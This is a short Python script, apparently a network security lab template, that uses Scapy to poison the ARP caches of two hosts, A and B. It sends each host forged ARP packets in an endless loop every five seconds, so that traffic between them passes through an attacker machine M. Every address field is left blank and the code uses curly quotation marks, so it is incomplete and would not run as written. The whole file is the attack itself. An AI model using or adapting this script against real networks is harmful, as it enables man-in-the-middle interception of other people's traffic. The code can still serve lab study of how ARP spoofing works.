#!/usr/bin/env/python3

from scapy.all import *
import time

def sen_arp_A():
#send to A and replace B’s IP binding to B IP and M MAC
        E = Ether()
        E.src = “”
        E.dst = “”
        A = ARP()
        A.op = 1
        A.hwsrc = “”
        A.psrc = “”
        A.hwdst = “”
        A.pdst = “”

        print(“Sending the following packet to A\n”)
        p = E/A
        p.show()
        sendp(p)

def sen_arp_B():
#send to B and replace A’s IP binding to A IP and M MAC
        E = Ether()
        E.src = “”
        E.dst = “”
        A = ARP()
        A.op = 1
        A.hwsrc = “”
        A.psrc = “”
        A.hwdst = “”
        A.pdst = “”

        print(“Sending the following packet to B\n”)
        p = E/A
        p.show()
        sendp(p)

if __name__ == “__main__”:
        while(1):
                sen_arp_A()
                sen_arp_B()
                time.sleep(5)
